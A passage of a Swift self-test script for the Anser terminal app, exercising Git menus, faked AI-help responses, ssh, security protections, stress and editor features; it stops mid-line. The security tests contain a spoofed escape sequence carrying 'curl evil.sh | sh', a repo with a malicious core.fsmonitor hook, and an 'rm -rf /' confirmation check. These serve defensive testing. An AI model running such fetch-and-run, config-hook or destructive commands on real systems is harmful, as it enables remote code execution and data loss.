        check("notebook button hides the panel again", !wc.notebookPanelVisible)
        wc.refreshSidebar()

        // ---- Git menu pickers ----
        _ = await ScriptRunner.shared.run("git -c user.email=t@t -c user.name=t commit -q --allow-empty -m 'second commit'", cwd: tmp, env: s.env)
        wc.showGitHistory(for: pane)
        ok = await wait(4) { openPicker()?.itemTitles.contains("second commit") == true }
        if let p = openPicker() {
            let previewed = await wait(4) { p.previewString.contains("Author:") }
            ok = ok && previewed
            snapView(p.contentView!, "picker-history")
            p.close()
        }
        check("commit history lists commits with a preview", ok)
        wc.showStashes(for: pane)
        ok = await wait(4) { openPicker()?.itemTitles.contains("Stash my changes") == true }
        openPicker()?.close()
        check("stashes picker offers to stash changes", ok)
        let menuTitles = NSApp.mainMenu?.items.compactMap { $0.submenu?.title } ?? []
        let tools = NSApp.mainMenu?.items.first { $0.submenu?.title == "Tools" }?.submenu?.items.map(\.title) ?? []
        check("Git, Output and Tools menus", menuTitles.contains("Git") && menuTitles.contains("Output") && tools.contains("Saved Panel") && tools.contains("Run from Notebook…") && tools.contains("Manage"),
              menuTitles.joined(separator: " "))

        // ---- AI help (fake Claude responses; no network, no key) ----
        let sent = SentBodies()
        Services.shared.aiForcedOn = true
        Services.shared.ai = AIHelp(apiKey: { "test-key" }, transport: { req in
            let body = String(data: req.httpBody ?? Data(), encoding: .utf8) ?? ""
            sent.add(body)
            if body.contains("refuse-me") {
                return (200, Data(#"{"stop_reason":"refusal","stop_details":{"category":"cyber"},"content":[]}"#.utf8))
            }
            let text = body.contains("failed with exit code")
                ? "The branch has no upstream yet, so `git push` doesn't know where to push.\n```sh\ngit push -u origin HEAD\n```"
                : "Finds big files changed this week:\n```sh\nfind . -size +100M -mtime -7\n```"
            return (200, Data(try! JSONSerialization.data(withJSONObject: ["stop_reason": "end_turn", "content": [["type": "text", "text": text]]])))
        })
        pane.run("false && echo 'password=hunter2' # anser-selftest-ai")
        _ = await wait(10) { s.blocks.last?.command.contains("anser-selftest-ai") == true && s.atPrompt }
        await sleep(0.3)
        pane.layoutSubtreeIfNeeded()
        snap(pane, "explain-chip")
        pane.explainLastError()
        func aiPanel() -> AIPanel? { NSApp.windows.compactMap { $0 as? AIPanel }.first { $0.isVisible } }
        ok = await wait(5) { aiPanel()?.answer != nil }
        check("Explain shows Claude's answer and a command", ok && aiPanel()?.answer?.commands == ["git push -u origin HEAD"])
        check("request uses the default model and fallbacks", sent.all.last?.contains("claude-opus-5-5") == true && sent.all.last?.contains("\"fallbacks\":\"default\"") == true)
        if let p = aiPanel(), let v = p.contentView { snapView(v, "ai-explain") }
        aiPanel()?.insert("git push -u origin HEAD")
        check("Insert puts the command in the editor (not run)", pane.editor.string == "git push -u origin HEAD" && s.atPrompt)
        pane.editor.clear()
        pane.askClaude()
        ok = await wait(3) { aiPanel() != nil }
        if let p = aiPanel() {
            p.show(try! await Services.shared.ai.generateCommand("big files this week", context: .init(shell: "zsh", os: "macOS", cwdName: "x", gitBranch: nil)))
            check("Ask Claude generates a command", p.answer?.commands.first == "find . -size +100M -mtime -7")
            p.close()
        }
        do {
            _ = try await Services.shared.ai.generateCommand("refuse-me", context: .init(shell: "zsh", os: "macOS", cwdName: "x", gitBranch: nil))
            check("refusals are reported, not shown as answers", false)
        } catch {
            check("refusals are reported, not shown as answers", (error as? AIHelp.AIError) == .refused("cyber"))
        }

        // GitHub Copilot as the provider (fake CLI run; no network): the explain flow and labels switch over.
        let copilotArgs = ArgsCapture()
        Services.shared.ai = AIHelp(copilotPath: { "/fake/copilot" }, runner: { argv, _ in
            copilotArgs.set(argv)
            return (0, #"{"type":"assistant.message","data":{"model":"gpt-test","content":"No upstream yet.\n```sh\ngit push -u origin HEAD\n```"}}"#, false)
        })
        pane.explainLastError()
        ok = await wait(5) { aiPanel()?.answer != nil }
        check("Copilot answers through the same panel, with tools off",
              ok && aiPanel()?.answer?.commands == ["git push -u origin HEAD"] && aiPanel()?.answer?.model == "GitHub Copilot · gpt-test"
                && copilotArgs.get().last == "--available-tools" && !copilotArgs.get().contains { $0.contains("hunter2") },
              aiPanel()?.answer?.model ?? "no answer")
        check("labels name the chosen AI", Services.shared.aiName == "GitHub Copilot")
        aiPanel()?.close()
        Services.shared.aiOverride = nil
        Services.shared.aiForcedOn = false

        // ---- ssh: run the exact bootstrap ssh would send, in a nested local shell ----
        let before = s.blocks.count
        pane.run("zsh -c \"$(_anser_ssh_command)\" # anser-selftest-ssh")
        ok = await wait(40) { s.isRemote && s.atPrompt }
        check("remote hooks connect (editor works over ssh)", ok && pane.editorUsable, s.displayCwd)
        await sleep(0.3)
        pane.layoutSubtreeIfNeeded()
        snap(pane, "remote")
        pane.run("echo remote-ok # anser-selftest")
        ok = await wait(15) { s.blocks.last?.command == "echo remote-ok # anser-selftest" && s.atPrompt }
        await sleep(0.8)
        check("remote command recorded with its output", ok && s.blocks.last?.exitCode == 0 && (pane.output(ofBlock: s.blocks.count - 1) ?? "").contains("remote-ok"),
              pane.output(ofBlock: s.blocks.count - 1)?.prefix(30).description ?? "nil")
        let remoteHist = Services.shared.history.entries(session: s.id, limit: 3).first
        check("remote history is marked with the host", remoteHist?.cwd?.hasPrefix("ssh://") == true, remoteHist?.cwd ?? "-")
        let rc = await Services.shared.engine.complete(CompletionContext(line: "cd ", cursor: 3, cwd: s.cwd), env: s.env)
        check("completion skips this Mac's folders when remote", !rc.contains { $0.kind == .folder })
        pane.run("exit")
        ok = await wait(20) { !s.isRemote && s.atPrompt && s.running == nil }
        let sshIdx = s.blocks.lastIndex { $0.command.contains("anser-selftest-ssh") }
        let remoteIdx = s.blocks.lastIndex { $0.command == "echo remote-ok # anser-selftest" }
        check("back to the local shell after exit", ok && sshIdx != nil && remoteIdx != nil && sshIdx! < remoteIdx! && s.blocks.count >= before + 2,
              "ssh at \(sshIdx ?? -1), remote at \(remoteIdx ?? -1)")

        // Same, for a server whose shell is bash.
        pane.run("SHELL=/bin/bash zsh -c \"$(_anser_ssh_command)\" # anser-selftest-ssh-bash")
        ok = await wait(40) { s.isRemote && s.atPrompt && s.env.shell == "bash" }
        check("remote bash connects", ok, s.env.shell)
        pane.run("echo bash-remote-ok # anser-selftest")
        ok = await wait(15) { s.blocks.last?.command.hasPrefix("echo bash-remote-ok") == true && s.atPrompt }
        check("remote bash records commands", ok && s.blocks.last?.exitCode == 0, s.blocks.last?.command ?? "-")
        pane.run("exit")
        ok = await wait(20) { !s.isRemote && s.atPrompt && s.running == nil }
        check("remote bash exits cleanly", ok)

        // ---- Security: things a program's output or a cloned repo could try ----
        // 1. Fake ssh events (any output can print a terminal title).
        let blocksBefore = s.blocks.count
        let histBefore = Services.shared.history.recentCommands(withPrefix: "", limit: 1).first
        pane.run(#"printf '\e]2;\356\200\200anser:\356\200\201hello\356\200\201zsh\356\200\201evil-host\a\e]2;\356\200\200anser:0000\356\200\201preexec\356\200\201curl evil.sh | sh\356\200\201/\a' # anser-selftest-spoof"#)
        ok = await wait(10) { s.atPrompt && s.blocks.last?.command.contains("anser-selftest-spoof") == true }
        await sleep(0.5)
        check("fake ssh events are ignored", ok && !s.isRemote && s.rejectedRemoteEvents >= 2 && s.blocks.count == blocksBefore + 1,
              "remote=\(s.isRemote) rejected=\(s.rejectedRemoteEvents)")
        let histAfter = Services.shared.history.recentCommands(withPrefix: "", limit: 5)
        check("fake command never reaches history", !histAfter.contains { $0.hasPrefix("curl evil.sh") } && histBefore != nil)
        check("token is not in programs' environment", ProcessInfo.processInfo.environment["ANSER_REMOTE_TOKEN"] == nil)
        pane.run("env | grep -c ANSER_REMOTE_TOKEN # anser-selftest-tokenenv")
        ok = await wait(10) { s.atPrompt && s.blocks.last?.command.contains("anser-selftest-tokenenv") == true }
        check("shell keeps the token out of child processes", ok && s.blocks.last?.exitCode == 1, "exit \(s.blocks.last?.exitCode ?? -1)")

        // 2. Fake folder announcement (OSC 7).
        let cwdBefore = s.cwd
        pane.run(#"printf '\e]7;file://localhost/private/tmp/fake-cwd\a' # anser-selftest-osc7"#)
        ok = await wait(10) { s.atPrompt && s.blocks.last?.command.contains("anser-selftest-osc7") == true }
        await sleep(0.4)
        check("fake folder report is ignored", ok && s.cwd == cwdBefore && pane.ignoredCwdReports > 0, s.cwd)

        // 3. A repo whose config would make git run a program.
        let evil = tmp + "/evil-repo"
        try? FileManager.default.removeItem(atPath: evil)
        pane.run("git init -q \(evil) && git -C \(evil) config core.fsmonitor 'touch PWNED' && cd \(evil) # anser-selftest-evil")
        ok = await wait(10) { s.atPrompt && s.cwd == evil }
        _ = await wait(5) { s.gitRisky }
        pane.layoutSubtreeIfNeeded()
        check("risky repo: automatic git checks are off", ok && s.gitRisky && s.gitChangeCount == 0, s.cwd)
        check("risky repo: branch chip warns", pane.branchChipTooltip?.contains("checks are off") == true, pane.branchChipTooltip ?? "-")
        pane.run("cd \(tmp) # anser-selftest")
        _ = await wait(10) { s.atPrompt && s.cwd == tmp }

        // 4. ⌘-click on something runnable reveals it instead of launching it.
        try? "#!/bin/sh\necho hi\n".write(toFile: tmp + "/run-me.command", atomically: true, encoding: .utf8)
        try? FileManager.default.createDirectory(atPath: tmp + "/Fake.app/Contents", withIntermediateDirectories: true)
        pane.run("echo run-me.command Fake.app # anser-selftest-links")
        _ = await wait(10) { s.atPrompt && s.blocks.last?.command.contains("anser-selftest-links") == true }
        await sleep(0.3)
        _ = pane.openLink("run-me.command")
        check("⌘-click a .command reveals it, never runs it", pane.lastOpenAction == "reveal", pane.lastOpenAction)
        _ = pane.openLink("Fake.app")
        check("⌘-click an app bundle reveals it", pane.lastOpenAction == "reveal", pane.lastOpenAction)

        // 5. Clipboard writes from programs need consent.
        check("programs must ask to write the clipboard", GhosttyRuntime.shared.configText.contains("clipboard-write = ask"))

        // ---- Stress ----
        func hangs() -> Int { Diagnostics.shared.recentBreadcrumbs.filter { $0.contains("HANG:") }.count }
        let hangsBefore = hangs()

        // Typing speed: 60 keystrokes through the full editor path.
        var t0 = Date()
        type(pane, "git commit -m 'stress test of typing speed in the editor' --amend")
        let perKey = Date().timeIntervalSince(t0) * 1000 / 60
        check("typing stays fast", perKey < 25, String(format: "%.1f ms per key (debug build)", perKey))
        pane.editor.clear()

        // Huge output (memory is sampled while it runs).
        let memProbe = MemoryProbe()
        t0 = Date()
        pane.run("seq 1 3000000 # anser-selftest")
        ok = await wait(90) { s.blocks.last?.command.hasPrefix("seq 1 3000000") == true && s.atPrompt }
        await sleep(1)
        memoryLog.append("3 million lines: " + memProbe.finish())
        let secs = Date().timeIntervalSince(t0)
        check("3 million lines of output", ok && secs < 30, String(format: "%.1fs", secs))
        await sleep(0.5)
        // Give the tab's last 20 commands 3 MB of output each, as a run of big builds would.
        let bigLog = String(repeating: "build log line with some text\n", count: 100_000)
        for i in s.blocks.indices.suffix(20) { s.setOutput(bigLog, forBlockAt: i) }
        check("a tab keeps at most 12 MB of output in memory (not 60 MB)", s.outputBytes <= OutputBudget.standard.total
              && (s.blocks.last?.output?.utf8.count ?? 0) <= OutputBudget.standard.newest && s.outputBytes > 1 << 20,
              MemoryUse.megabytes(UInt64(s.outputBytes)))
        MemoryManager.shared.trim(critical: false)
        check("when macOS is short of memory, Anser keeps much less", s.outputBytes <= OutputBudget.tight.total, MemoryUse.megabytes(UInt64(s.outputBytes)))
        s.outputBudget = .standard
        let bigCopy = String(repeating: "x", count: 2 << 20)
        NSPasteboard.general.clearContents()
        NSPasteboard.general.setString(bigCopy, forType: .string)
        await sleep(1)
        check("huge copies aren't kept in clipboard history", !Services.shared.clipboard.items.contains { $0.text.utf8.count > ClipboardHistory.maxItemBytes })
        NSPasteboard.general.clearContents()
        check("scrollback per tab is set", GhosttyRuntime.shared.configText.contains("scrollback-limit = \(Services.shared.config.scrollbackMB * 1_000_000)"))

        // Resizing while output streams.
        let memProbe2 = MemoryProbe()
        let frame0 = wc.window!.frame
        pane.run("seq 1 1500000 # anser-selftest")
        for i in 0..<12 {
            wc.window!.setFrame(frame0.insetBy(dx: CGFloat(i % 3) * 40, dy: CGFloat(i % 2) * 30), display: true)
            await sleep(0.08)
        }
        wc.window!.setFrame(frame0, display: true)
        ok = await wait(60) { s.blocks.last?.command.hasPrefix("seq 1 1500000") == true && s.atPrompt }
        check("resizing during output", ok)
        await sleep(1)
        memoryLog.append("resizing during output: " + memProbe2.finish())

        // Big paste into the editor.
        let big = (1...5000).map { "echo line \($0) | grep -v nothing" }.joined(separator: "\n")
        t0 = Date()
        pane.editor.setCommand(big)
        pane.layoutSubtreeIfNeeded()
        let pasteMs = Date().timeIntervalSince(t0) * 1000
        check("5,000-line paste into the editor", pane.editor.logicalLineCount == 5000 && pasteMs < 3000, String(format: "%.0f ms", pasteMs))
        pane.editor.clear()

        // A full-screen program opens and closes cleanly.
        pane.run("vim -u NONE -N -c 'sleep 400m' -c q # anser-selftest")
        let sawFullscreen = await wait(5) { pane.isFullscreenProgram }
        ok = await wait(15) { s.atPrompt && !pane.isFullscreenProgram }
        check("vim opens full screen and returns", sawFullscreen && ok && pane.editorUsable)

        check("no UI hangs during stress", hangs() == hangsBefore, "\(hangs() - hangsBefore) hangs logged")

        // Live appearance change (only against a throwaway config folder).
        let cfgDir = AnserConfig.directory.path
        if cfgDir.hasPrefix(NSTemporaryDirectory()) || cfgDir.hasPrefix("/private/var/folders") || cfgDir.hasPrefix("/var/folders") {
            let json = #"{"appearance":{"theme":"Dracula","fontFamily":"Menlo"},"editor":{"fontSize":15}}"#
            try? json.write(to: AnserConfig.fileURL, atomically: true, encoding: .utf8)
            ok = await wait(5) { pane.editor.font?.familyName == "Menlo" }
            let bg = GhosttyRuntime.shared.theme.background.usingColorSpace(.sRGB)
            let isDracula = bg.map { abs($0.redComponent - 40.0 / 255) < 0.02 && abs($0.blueComponent - 54.0 / 255) < 0.02 } ?? false
            check("theme and font apply live", ok && isDracula && pane.editor.font?.pointSize == 15,
                  "font=\(pane.editor.font?.familyName ?? "-") bg=\(bg.map { "\(Int($0.redComponent * 255)),\(Int($0.greenComponent * 255)),\(Int($0.blueComponent * 255))" } ?? "-")")
            await sleep(0.3)
            snap(pane, "dracula")
            snapView(wc.tabBar, "tabbar-dracula")
            // Light theme pass.
            try? #"{"appearance":{"theme":"GitHub Light Default"}}"#.write(to: AnserConfig.fileURL, atomically: true, encoding: .utf8)
            ok = await wait(5) { !GhosttyRuntime.shared.theme.isDark }
            check("light theme applies", ok)
            await sleep(0.4)
            snap(pane, "light", full: true)
            snapView(wc.tabBar, "tabbar-light")
            wc.showBranchSwitcher(for: pane)
            _ = await wait(3) { NSApp.windows.contains { ($0 as? PickerPanel)?.isVisible == true } }
            await sleep(0.4)
            if let p = NSApp.windows.compactMap({ $0 as? PickerPanel }).first(where: { $0.isVisible }), let v = p.contentView { snapView(v, "picker-light"); p.close() }
        }

        // Errors stay visible: a missing command's message isn't hidden or covered by the input area.
        pane.run("anser-no-such-tool --flag # anser-selftest")
        ok = await wait(10) { s.atPrompt && s.blocks.last?.command.hasPrefix("anser-no-such-tool") == true }
        await sleep(0.5)
        pane.layoutSubtreeIfNeeded()
        let errText = pane.surfaceView.viewportText() ?? ""
        let errLines = errText.split(separator: "\n", omittingEmptySubsequences: false).map(String.init)
        let errRow = errLines.lastIndex { $0.contains("command not found") }
        check("a missing command's error is printed", errRow != nil, errLines.suffix(4).joined(separator: " ⏎ "))
        if errRow != nil, let outputBottom = pane.outputBottomForTest {
            // Floating under the output: its top is below the last output line. At the bottom: the terminal ends above it.
            let clear = pane.followTop != nil ? pane.barTopForTest <= outputBottom + 0.5 : pane.surfaceView.frame.minY >= pane.barTopForTest - 0.5
            check("the input area doesn't cover the error", clear,
                  "bar top \(Int(pane.barTopForTest)) · output bottom \(Int(outputBottom)) · terminal bottom \(Int(pane.surfaceView.frame.minY))")
        }
        snap(pane, "error-visible", full: true)

        pane.run("ls /anser-no-such-dir # anser-selftest")
        ok = await wait(10) { s.atPrompt && s.blocks.last?.command.hasPrefix("ls /anser-no-such-dir") == true }
        await sleep(0.4)
        check("a program's error output shows too", (pane.surfaceView.viewportText() ?? "").contains("No such file or directory"))

        check("result marks never cover command text",
              !BlocksOverlayView.markFits(command: String(repeating: "x", count: 300), cellWidth: 8, markStart: 900)
                && BlocksOverlayView.markFits(command: "ls", cellWidth: 8, markStart: 900)
                && !BlocksOverlayView.markFits(command: "echo a\necho b", cellWidth: 8, markStart: 900))

        // ---- Output search ----
        pane.run("echo anser-needle-$((40+2))-found # anser-selftest")
        ok = await wait(10) { s.atPrompt && s.blocks.last?.command.contains("anser-needle") == true }
        ok = await wait(5) { !Services.shared.history.searchOutput("anser-needle-42-found").isEmpty }
        check("command output is saved and searchable", ok || !Services.shared.config.saveOutput,
              Services.shared.history.searchOutput("anser-needle-42").first?.line ?? "no hit")
        wc.showHistorySearch(for: pane, scope: .output)
        ok = await wait(3) { openPickerTitles().contains { $0.contains("anser-needle") } }
        check("History → Output scope finds it", ok || !Services.shared.config.saveOutput, openPickerTitles().prefix(3).joined(separator: " | "))
        closePickers()

        // ---- Profiles: badge, tab color, ask before running ----
        Services.shared.setProfilesForTest([Profile(folder: tmp, tabColor: "red", badge: "TESTPROD", confirm: ["*danger*"])])
        pane.updateProfile()
        check("folder profile shows a badge and colors the tab",
              pane.profile?.badge == "TESTPROD" && wc.tab(for: pane)?.profileColor == "red", "\(String(describing: pane.profile))")
        pane.layoutSubtreeIfNeeded()
        snap(pane, "profile-badge")
        pane.submitFromEditor("echo danger-zone")
        ok = await wait(2) { pane.lastConfirmation != nil }
        if let alert = pane.lastConfirmation, let w = pane.window, let sheet = w.attachedSheet {
            check("profile asks before running matching commands", alert.messageText.contains("TESTPROD"), alert.messageText)
            w.endSheet(sheet, returnCode: .alertSecondButtonReturn)
            ok = await wait(2) { pane.editor.string == "echo danger-zone" }
            check("cancelling puts the command back in the editor", ok, pane.editor.string)
        } else {
            check("profile asks before running matching commands", false, "no confirmation shown")
        }
        pane.editor.clear()
        Services.shared.setProfilesForTest([])
        pane.updateProfile()
        check("profile clears when it no longer applies", pane.profile == nil && wc.tab(for: pane)?.profileColor == nil)

        // ---- Type in all panes ----
        wc.split(pane, vertical: true)
        let mate = wc.allPanes.first { $0 !== pane }!
        ok = await wait(30) { mate.session.integrated && mate.session.atPrompt }
        wc.toggleBroadcast(for: pane)
        check("broadcast turns on for the tab", wc.isBroadcasting(pane) && wc.isBroadcasting(mate))
        pane.layoutSubtreeIfNeeded()
        snap(pane, "broadcast")
        pane.submitFromEditor("echo anser-broadcast-ok # anser-selftest")
        ok = await wait(10) { mate.session.blocks.last?.command == "echo anser-broadcast-ok # anser-selftest" && mate.session.atPrompt && s.atPrompt }
        check("a command runs in every pane of the tab", ok, mate.session.blocks.last?.command ?? "none")
        wc.toggleBroadcast(for: pane)
        check("broadcast turns off", !wc.isBroadcasting(pane))
        Services.shared.tipsForcedOn = true
        Services.shared.resetTipsForTest()
        wc.close(mate)

        // ---- One-time tips ----
        for _ in 0..<6 { Services.shared.tip(in: pane) { $0.historyArrow() } }
        check("a tip appears at the moment it helps, in the status row", pane.lastTip?.contains("⌘R") == true && pane.hintText.contains("⌘R"),
              pane.hintText)
        pane.layoutSubtreeIfNeeded()
        snap(pane, "tip", full: true)
        let firstTip = pane.lastTip
        pane.hideTip()
        for _ in 0..<6 { Services.shared.tip(in: pane) { $0.historyArrow() } }
        check("each tip shows only once", pane.lastTip == firstTip)
        pane.hideTip()
        Services.shared.tipsForcedOn = false

        // ---- Notebook: workflows listed, values asked before running ----
        wc.toggleNotebookPanel()
        await sleep(0.3)
        check("notebook panel lists this project's workflows too", wc.notebookPanel.workflowCount >= 1 && wc.notebookPanel.rowTitles.contains { $0.hasPrefix("Greet and count") },
              wc.notebookPanel.rowTitles.joined(separator: ", "))
        wc.toggleNotebookPanel()
        wc.runNotebookEntry(Notebook.Entry(title: "Greet", command: "echo hi {{who}}"), in: pane)
        ok = await wait(2) { pane.window?.attachedSheet != nil }
        check("running a saved command with {{values}} asks for them first", ok)
        if let w = pane.window, let sheet = w.attachedSheet { w.endSheet(sheet, returnCode: .alertSecondButtonReturn) }
        await sleep(0.2)

        // ---- Merge conflicts ----
        let repo = tmp + "/conflict-repo"
        try? FileManager.default.removeItem(atPath: repo)
        try? FileManager.default.createDirectory(atPath: repo, withIntermediateDirectories: true)
        let g = "git -c user.email=t@t -c user.name=t"
        _ = await ScriptRunner.shared.run("""
            git init -q -b main && echo base > f.txt && git add f.txt && \(g) commit -qm base && git switch -qc other && echo theirs > f.txt && \(g) commit -qam theirs \
            && git switch -q main && echo mine > f.txt && \(g) commit -qam mine && (\(g) merge -q other >/dev/null 2>&1 || true)
            """, cwd: repo, env: s.env, timeout: 10)
        pane.run("cd \(ShellLexer.escape(repo))")
        ok = await wait(10) { s.atPrompt && s.cwd.hasSuffix("conflict-repo") }
        ok = await wait(6) { pane.conflicts.count == 1 && pane.gitOperation == .merge }
        check("conflicts show in the status row during a merge", ok, "\(pane.conflicts.map(\.path)) \(String(describing: pane.gitOperation))")
        pane.layoutSubtreeIfNeeded()
        snap(pane, "conflicts")
        wc.showConflicts(for: pane)
        ok = await wait(4) { openPickerTitles().contains("f.txt") && openPickerTitles().contains { $0.hasPrefix("Abort the merge") } }
        check("conflict resolver lists files and abort", ok, openPickerTitles().joined(separator: " | "))
        if let p = openPicker() { _ = await wait(3) { p.previewString.contains("<<<<<<<") || p.previewString.contains("mine") }; snapView(p.contentView!, "picker-conflicts") }
        closePickers()
        pane.run("git merge --abort; cd \(ShellLexer.escape(tmp))")
        _ = await wait(10) { s.atPrompt && s.cwd.hasSuffix("anser-selftest") }

        // ---- Quick terminal ----
        QuickTerminal.shared.configure("ctrl+alt+shift+f12")
        check("quick terminal shortcut registers", QuickTerminal.shared.hotKey != nil, QuickTerminal.shared.problem ?? "")
        QuickTerminal.shared.show()
        ok = await wait(3) { QuickTerminal.shared.isShown }
        let qw = QuickTerminal.shared.controller?.window
        let top = qw.map { abs($0.frame.maxY - ($0.screen ?? NSScreen.main!).visibleFrame.maxY) < 2 } ?? false
        check("quick terminal drops down at the top of the screen", ok && top && qw?.level == .floating, "\(qw?.frame ?? .zero)")
        QuickTerminal.shared.hide()
        check("quick terminal hides again", !QuickTerminal.shared.isShown)
        QuickTerminal.shared.controller?.forceClose()
        QuickTerminal.shared.configure(nil)
        wc.window?.makeKeyAndOrderFront(nil)

        // ---- Notification click returns to the tab; import from other terminals ----
        check("a finished-command notification can bring its tab back", AppDelegate.shared.reveal(sessionID: s.id))
        let themesDir = tmp + "/themes"
        try? FileManager.default.removeItem(atPath: themesDir)
        var found = Importers.Found(source: "Warp")
        found.themes = [Importers.Theme(name: "Warp - Test", text: "background = #101010\nforeground = #eeeeee\n")]
        found.entries = [Notebook.Entry(title: "Imported one", command: "echo imported-from-warp")]
        let summary = AppDelegate.performImport([found], applyLook: false, themesDir: themesDir, notebookURL: NotebookWindow.fileURL)
        let nbAfter = (try? Notebook.load(from: NotebookWindow.fileURL)) ?? Notebook()
        check("import writes themes and workflows", FileManager.default.fileExists(atPath: themesDir + "/Warp - Test")
              && nbAfter.groups.contains { $0.name == "From Warp" && $0.entries.contains { $0.command == "echo imported-from-warp" } },
              summary.replacingOccurrences(of: "\n", with: " "))

        // ---- Kept shells come back after a restart ----
        if SessionHost.shared.enabled {
            wc.addTab(cwd: tmp)
            let kp = wc.focusedPane!
            ok = await wait(30) { kp.session.integrated && kp.session.atPrompt }
            kp.run("export ANSER_KEPT=kept-42; echo before-restart-marker # anser-selftest")
            ok = await wait(10) { kp.session.atPrompt && kp.session.blocks.last?.command.contains("before-restart") == true }
            let keptID = kp.session.id
            check("new panes run through the session helper", ok && kp.session.persistent && SessionHost.shared.liveIDs().contains(keptID), keptID)
            // "Quit": save it and let go of the pane without ending the shell.
            SessionHost.shared.save(kp.session)
            kp.keepShellOnClose = true
            wc.closeTab(wc.tabs.count - 1)
            await sleep(1)
            check("the shell keeps running after its pane is gone", SessionHost.shared.liveIDs().contains(keptID))
            // "Reopen": restore the tab from its saved layout.
            SessionHost.shared.refreshLive()
            wc.addTab(restoring: .pane(cwd: tmp, session: keptID))
            let back = wc.focusedPane!
            check("it comes back as it was (ready at the prompt, same history)",
                  back.session.id == keptID && back.session.integrated && back.session.atPrompt
                    && back.session.blocks.last?.command.contains("before-restart") == true)
            ok = await wait(5) { (back.surfaceView.viewportText() ?? "").contains("before-restart-marker") }
            check("its earlier output is shown again", ok)
            back.run("echo value=$ANSER_KEPT # anser-selftest")
            ok = await wait(10) { (back.surfaceView.viewportText() ?? "").contains("value=kept-42") }
            check("it's the same shell (its variables are still set)", ok)
            snap(back, "reattached", full: true)
            wc.closeTab(wc.tabs.count - 1)
            ok = await wait(6) { !SessionHost.shared.liveIDs().contains(keptID) }
            check("closing a tab ends its shell", ok)
            wc.window?.makeKeyAndOrderFront(nil)
        } else {
            check("new panes run through the session helper", false, "helper missing or setting off")
        }

        // ---- Quick Look on hover, SSH hosts ----
        try? "hello from a previewed file\n".write(toFile: tmp + "/preview-me.txt", atomically: true, encoding: .utf8)
        let candidate = pane.previewCandidate("preview-me.txt:3")
        check("a printed file path (with :line) is found for Quick Look", candidate?.hasSuffix("preview-me.txt") == true, candidate ?? "none")
        check("missing files aren't previewed", pane.previewCandidate("no-such-file.txt") == nil)
        if let candidate {
            wc.window?.makeKeyAndOrderFront(nil)
            pane.showPreview(of: candidate, at: NSPoint(x: 80, y: 120))
            ok = await wait(2) { pane.previewShowing }
            check("hovering a path shows its preview", ok && pane.previewedPath == candidate)
            pane.mouseMovedOverOutput(at: NSPoint(x: 400, y: 400))
            check("moving away closes it", !pane.previewShowing)
        }
        let sshText = "Host prod-web *.internal\n  HostName 10.0.0.5\n  User deploy\nHost *\n  ServerAliveInterval 30\n"
        let parsedHosts = SSHConfig.hosts(in: sshText)
        check("SSH hosts come from ~/.ssh/config (patterns skipped)", parsedHosts.map(\.alias) == ["prod-web"] && parsedHosts.first?.detail == "deploy@10.0.0.5")
        Services.shared.setProfilesForTest([Profile(host: "prod-*", tabColor: "red", badge: "PRODSSH")])
        pane.sessionDidStartCommand(s, command: "ssh prod-web")
        check("a profile applies as soon as you ssh to a matching host", pane.profile?.badge == "PRODSSH", pane.sshTarget ?? "no target")
        Services.shared.setProfilesForTest([])
        pane.sessionDidShowPrompt(s)
        check("it clears when the ssh command ends", pane.profile == nil && pane.sshTarget == nil)

        // ---- Editor: mistakes, brackets, cursors, lines, ⌃R, AI, vim ----
        let edt = pane.editor
        wc.window?.makeFirstResponder(edt)
        edt.setCommand("tre -L 2 ")
        check("an unknown command is flagged once you move past it", edt.hintIssue?.message.contains("“tre”") == true, edt.hintIssue?.message ?? "none")
        edt.setCommand("echo 'oops")
        edt.setSelectedRange(NSRange(location: 0, length: 0))
        check("an unclosed quote is flagged", edt.hintIssue?.message.contains("quote") == true, edt.hintIssue?.message ?? "none")
        edt.setCommand("git push --force origin main")
        check("force push gets a warning", edt.hintIssue?.severity == .warning && edt.hintIssue?.message.contains("force-with-lease") == true)
        pane.layoutSubtreeIfNeeded()
        snap(pane, "editor-warning")
        edt.setCommand("echo $(date)")
        check("the matching bracket is highlighted", edt.bracketPair?.0 == 6 && edt.bracketPair?.1 == 11, "\(String(describing: edt.bracketPair))")
        edt.clear()
        pane.submitFromEditor("rm -rf / # anser-selftest")
        ok = await wait(2) { pane.lastConfirmation?.messageText == "Run this anyway?" }
        check("a destructive command asks before running", ok)
        if let w = pane.window, let sheet = w.attachedSheet { w.endSheet(sheet, returnCode: .alertFirstButtonReturn) }
        ok = await wait(2) { edt.string == "rm -rf / # anser-selftest" }
        check("cancelling keeps it in the editor, not run", ok && !(s.blocks.last?.command.hasPrefix("rm -rf /") ?? false))
        edt.setCommand("echo a; echo b")
        edt.setSelectedRange(NSRange(location: 5, length: 0))
        edt.extraSelections = [NSRange(location: 13, length: 0)]
        edt.insertText("X", replacementRange: NSRange(location: NSNotFound, length: 0))
        check("typing goes to every cursor", edt.string == "echo Xa; echo Xb", edt.string)
        edt.deleteBackward(nil)
        check("backspace too", edt.string == "echo a; echo b", edt.string)
        edt.setCommand("ls foo; cat foo")
        edt.setSelectedRange(NSRange(location: 3, length: 3))
        edt.selectNextOccurrence()
        edt.insertText("bar", replacementRange: NSRange(location: NSNotFound, length: 0))
        check("⌥⌘G adds the next match", edt.string == "ls bar; cat bar", edt.string)
        edt.setCommand("echo one\necho two")
        edt.setSelectedRange(NSRange(location: 0, length: 0))
        edt.toggleComment()
        let commented = edt.string
        edt.toggleComment()
        check("⌘/ comments a line out and back", commented == "# echo one\necho two" && edt.string == "echo one\necho two", commented)
        edt.setSelectedRange(NSRange(location: 0, length: 0))
        edt.moveLines(up: false)
        check("⌃⌘↓ moves a line down", edt.string == "echo two\necho one", edt.string)
        edt.duplicateLines(up: false)
        check("⇧⌥↓ duplicates it", edt.string.components(separatedBy: "\n").count == 3)
        edt.setCommand("anser-needle")
        edt.startInlineHistory()
        ok = await wait(2) { edt.popup.isVisible && edt.popup.items.contains { $0.insert.contains("anser-needle") } }
        check("⌃R shows matching history right under the editor", ok)
        snap(pane, "inline-history", full: true)
        edt.hidePopup()
        let hadAI = Services.shared.aiForcedOn, oldAI = Services.shared.aiOverride
        Services.shared.aiForcedOn = true
        Services.shared.ai = AIHelp(apiKey: { "k" }, transport: { _ in
            (200, Data(try! JSONSerialization.data(withJSONObject: ["stop_reason": "end_turn",
                "content": [["type": "text", "text": "Sizes, biggest last:\n```sh\ndu -sh * | sort -h\n```"]]])))
        })
        // A real event goes through the app first, like a key press would: macOS closes
        // its automatic undo group only after events (the test's edits above had none).
        if let e = NSEvent.otherEvent(with: .applicationDefined, location: .zero, modifierFlags: [], timestamp: 0,
